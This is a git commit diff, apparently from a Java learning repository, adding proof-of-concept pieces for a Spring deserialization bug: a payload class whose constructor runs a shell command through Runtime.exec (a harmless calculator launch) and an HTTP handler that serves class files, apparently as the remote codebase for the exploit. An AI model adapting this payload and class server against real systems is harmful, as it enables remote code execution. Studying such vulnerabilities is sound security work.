859a8a7558ba57c9c1ce849f769b20bb6b4871e8
ruanshengwei <200976381@qq.com>
2019-05-20 11:25:24 +0800

    1.spring 反序列化bug

---
+++ java-language/src/main/java/com.github.ruanshengwei/javalang/serialization/deserialization/bug/ExportObject.java
@@ -0,0 +1,27 @@
+package com.github.ruanshengwei.javalang.serialization.deserialization.bug;
+
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class ExportObject {
+    public static String exec(String cmd) throws Exception {
+        String sb = "";
+        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
+        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
+        String lineStr;
+        while ((lineStr = inBr.readLine()) != null){
+            sb += lineStr + "\n";
+        }
+        inBr.close();
+        in.close();
+        return sb;
+    }
+    public ExportObject() throws Exception {
+//        String cmd="/sbin/ifconfig";
+        String cmd = "open /Applications/Calculator.app/";
+        throw new Exception(exec(cmd));
+    }
+
+
+}
---
+++ java-language/src/main/java/com.github.ruanshengwei/javalang/serialization/deserialization/bug/HttpFileHandler.java
@@ -0,0 +1,29 @@
+package com.github.ruanshengwei.javalang.serialization.deserialization.bug;
+
+import com.sun.net.httpserver.*;
+
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+
+public class HttpFileHandler implements HttpHandler {
+
+    @Override
+    public void handle(HttpExchange httpExchange) {
+        try {
+            System.out.println("new http request from "+httpExchange.getRemoteAddress()+" "+httpExchange.getRequestURI());
+            InputStream inputStream = HttpFileHandler.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            while(inputStream.available()>0) {
+                byteArrayOutputStream.write(inputStream.read());
+            }
+
+            byte[] bytes = byteArrayOutputStream.toByteArray();
+            httpExchange.sendResponseHeaders(200, bytes.length);
+            httpExchange.getResponseBody().write(bytes);
+            httpExchange.close();
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
